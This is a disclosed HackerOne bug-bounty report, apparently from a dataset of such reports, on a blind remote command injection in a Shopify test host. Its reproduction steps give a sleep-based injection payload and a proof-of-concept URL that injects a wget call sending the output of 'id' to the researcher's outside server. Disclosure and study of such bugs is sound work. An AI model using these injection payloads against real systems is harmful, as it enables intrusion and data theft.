---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '73567'
original_report_id: '73567'
title: Attention! Remote Code Execution at http://wpt.ec2.shopify.com/
weakness: Command Injection - Generic
team_handle: shopify
created_at: '2015-07-02T00:05:27.600Z'
disclosed_at: '2015-07-16T12:02:44.547Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 24
tags:
- hackerone
- command-injection-generic
---

# Attention! Remote Code Execution at http://wpt.ec2.shopify.com/

## Metadata

- HackerOne Report ID: 73567
- Weakness: Command Injection - Generic
- Program: shopify
- Disclosed At: 2015-07-16T12:02:44.547Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I just found a remote code execution bug at http://wpt.ec2.shopify.com/

**Reproduction**

1. Open 
2. In the text area enter  **$(`sleep 20`)** and hit "Update List" 
3. The result should come out at around 20 seconds, there-by executing sleep command

POC:  http://wpt.ec2.shopify.com/testlog.php?days=1&filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29

I've attached a video for this RCE bug, in which I had executed **id** command for verification purpose on the server and sent back the result to my Apache logs, as the RCE here is blind.

Regards,
Prakhar Prasad

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
